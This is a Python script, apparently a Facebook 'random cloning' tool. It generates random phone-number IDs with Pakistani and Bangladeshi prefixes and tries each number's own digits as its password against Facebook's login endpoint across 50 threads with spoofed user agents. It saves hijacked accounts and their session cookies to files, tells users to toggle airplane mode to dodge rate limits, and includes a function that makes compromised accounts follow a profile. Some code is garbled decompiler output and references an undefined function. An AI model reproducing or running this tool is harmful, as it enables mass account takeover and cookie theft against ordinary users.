import os
import sys
import time
import requests
import uuid
os.system('clear')

def o():
    os.system('clear')
    print(logo)
    #ip = requests.get("https://api.ipify.org").text
    #jalan("    \033[93;1m[\033[92;1m+\033[93;1m] \033[97;1mIP ADDRES \033[38;5;196m: \033[38;5;46m"+ip)
    print("\033[38;5;46m[+]==============================================[+]")
    jalan("\033[93;1m[\033[92;1m1\033[93;1m] \033[97;1mSTART RANDOM CLONING")
    print("\033[93;1m[\033[92;1m2\033[93;1m] \033[97;1mGITHUB")
    SpaceXRayhan = input('\033[93;1m[\033[92;1m?\033[93;1m] \033[97;1mSELECT\033[38;5;196m: ')
    if SpaceXRayhan == '1':
        i()
    
    if SpaceXRayhan == '2':
        os.system('xdg-open https://github.com/MR-AUH404')
    if SpaceXRayhan == 'E':
        os.system('exit')
        return None
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)

RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
GREEN = '\033[38;5;46m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
bi = random.choice([M,N,K,B,U])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo=("""\033[38;5;46m
                                                                                                      
\033[1;37m  ╔═══════════════════════════════════════════╗                                    
                  \033[1;37m _______                   
                  \033[1;37m(  ___  )|\     /||\     /|
                  \033[1;37m| (   ) || )   ( || )   ( |
                  \033[1;37m| (___) || |   | || (___) |
                  \033[1;37m|  ___  || |   | ||  ___  |
                  \033[1;37m| (   ) || |   | || (   ) |
                  \033[1;37m| )   ( || (___) || )   ( |
                  \033[1;37m|/     \|(_______)|/     \|\033[1;35mX ALINA \033[1;37m
\033[1;37m  ╚═══════════════════════════════════════════╝
\033[38;5;46m[+]==============================================[+]
\033[38;5;46m[+] \033[1;33mCREATED BY   :  \033[1;33mAHSAM UL HAQ JOIYA 
\033[38;5;46m[+] \033[1;34mON FACEBOK   :  \033[1;34mAHSAM UL HAQ 
\033[38;5;46m[+] \033[1;35mON GITHUB    :  \033[1;35mMR-AUH404
\033[38;5;46m[+] \033[1;36mTOOL STATUS  :  \033[1;36mFREE
\033[38;5;46m[+] \033[1;36mTOOL VIRSION :  \033[1;36m3.09 bata
\033[38;5;46m[+]==============================================[+]  
""")

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]

for xd in range(98605):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[93;1m[\033[92;1m+\033[93;1m]\033[1;97mPK CODE  \033[38;5;196m:\033[1;97m 92301 92302 92303 92305')
    print('\033[93;1m[\033[92;1m+\033[93;1m]\033[1;97mBD CODE  \033[38;5;196m:\033[1;97m 88016 88017 88018 88019')
    print('\033[93;1m[\033[92;1m+\033[93;1m]\033[1;97mNOTE     \033[38;5;196m:\033[1;97m [SUPER SPEED CLONEING]')
    print("\033[38;5;46m[+]==============================================[+]")
    code = input('\033[93;1m[\033[92;1m?\033[93;1m] \033[97;1mSELECT CODE\033[38;5;196m: ')
    print("")
    os.system('clear')
    print(logo)
    print("\033[93;1m[\033[92;1m+\033[93;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[1;35m10000\033[1;97m/\033[1;34m20000\033[1;97m/\033[38;5;46m30000")
    limit = int(input("\033[93;1m[\033[92;1m?\033[93;1m] \033[1;97mCRACK ID LIMIT \033[38;5;196m: \033[38;5;46m"))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as setu:
        clear()
        tl = str(len(user))
        jalan('\033[93;1m[\033[92;1m+\033[93;1m] \033[97;1mSIM CODE  \033[38;5;196m: \033[38;5;46m'+code)
        jalan('\033[93;1m[\033[92;1m+\033[93;1m] \033[97;1mCRACK ID  \033[38;5;196m: \033[38;5;46m'+tl)
        print('\033[93;1m[\033[92;1m+\033[93;1m] \033[97;1mFILE SAVE \033[38;5;196m: \033[38;5;46mBD-OK.txt')
        print('\033[93;1m[\033[92;1m+\033[93;1m] \033[97;1mUSE EVERY 2 MIN  \033[38;5;196m: \033[38;5;196m[AIRPLANE MODE]')
        print('\033[93;1m[\033[92;1m+\033[93;1m] \033[97;1m[USE MOBIL DATA]')
        print("\033[38;5;46m[+]==============================================[+]")
        for love in user:
            pwx = [love]
            uid = code+love
            setu.submit(rcrack,uid,pwx,tl)
    print('\nCRACK PROCESS HAS BEEN COMPLETED ')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
              'accept-language': 'en-US,en;q=0.9',
              'cache-control': 'max-age=0',
     # 'cookie': 'datr=aHDpYrywQsGJld3HgP-Bckuf; sb=AZvsYt3_AYZZV5UMJHz_CS7D; vpd=v1%3B785x421x2.5687501430511475; locale=en_US; wd=421x785; dnonce=AWl9jAUuL4bR1dSTdwUZ3-jdOcnRRyZifTeW9rFOEREjBq1qeURbr3EIYcpiE_CAFyFKTJ93raItJhFUKdPEfTwZ; fr=0CGwRqCKGyjf7SGiw..Bj4Ez6.WI.AAA.0.0.Bj4Ez6.AWWWyIRo_ro',
              'referer': 'https://mbasic.facebook.com/', 
              'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
              'sec-ch-ua-mobile': '?1',
              'sec-ch-ua-platform': '"Android"',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origin',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1',
              'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25',
 }
            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[AHSAM-OK😍] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[+]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AUH-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[AHSAM-CP🤪] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AUH-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[AUH-Cracking] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
#Subscraption()
o()
